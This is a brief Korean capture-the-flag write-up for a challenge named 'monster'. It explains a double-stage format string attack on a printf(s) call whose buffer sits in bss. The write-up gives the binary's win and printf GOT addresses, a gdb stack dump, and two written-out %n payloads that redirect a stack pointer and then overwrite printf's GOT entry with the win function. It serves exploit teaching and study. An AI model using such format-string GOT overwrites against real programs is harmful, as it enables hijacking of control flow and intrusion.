# monster

본 문제는 `printf(s)`의 형식으로 사용하여 FSB 취약점이 발생하는 문제입니다. 다만 s가 bss영역에 쓰여지기 때문에 double stage FSB를 발생합니다.



win함수의 주소 : 0x080485bd

printf함수의 got : 0x804a00c



```python
gdb-peda$ x/100wx $esp
0xffffcf80:	0x0804a060	0x00000032	0xf7fb35a0	0x0804875d
0xffffcf90:	0xf7fb33dc	0xffffcfb0	0x00000000	0xf7e1b647
0xffffcfa0:	0xf7fb3000	0xf7fb3000	0x00000000	0xf7e1b647
0xffffcfb0:	0x00000001	0xffffd044	0xffffd04c	0x00000000
0xffffcfc0:	0x00000000	0x00000000	0xf7fb3000	0xf7ffdc04
0xffffcfd0:	0x00000001	0x00000000	0xf7fb3000	0xf7fb3000
0xffffcfe0:	0x00000000	0x62d3a61d	0x5e20c80d	0x00000000
0xffffcff0:	0x00000000	0x00000000	0xffffd040	0xf7fd9000
0xffffd000:	0xf7fd92e4	0x00000001	0x00000000	0xf7ffd000
0xffffd010:	0x00000001	0x08048490	0x00000000	0x080484b1
0xffffd020:	0x08048747	0x00000001	0xffffd044	0x08048870
0xffffd030:	0x080488d0	0xf7fe8880	0xffffd03c	0xf7ffd918
0xffffd040:	0x00000001	0xffffd227	0x00000000	0xffffd257
0xffffd050:	0xffffd262	0xffffd274	0xffffd28a	0xffffd2bd
0xffffd060:	0xffffd2cc	0xffffd300	0xffffd310	0xffffd327
0xffffd070:	0xffffd338	0xffffd34c	0xffffd36f	0xffffd381

```





##### 과정

1. fsb를 이용하여 stack안의 적당한 포인터인 0xffffcfb0의 자리에 printf의 got로 값 modify

> %8x %8x %8x %8x %8x %8x %8x %134520780x %n : 0xffffcfb0의 값을 0x804a00c(printf의 got)으로 변경

2. double stage fsb를 이용하여 printf함수의 got를 win함수의 주소로 덮어서 익스

> %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %8x %134514150x %n : printf의 got를 0x080485bd(win함수의 주소)로 변경

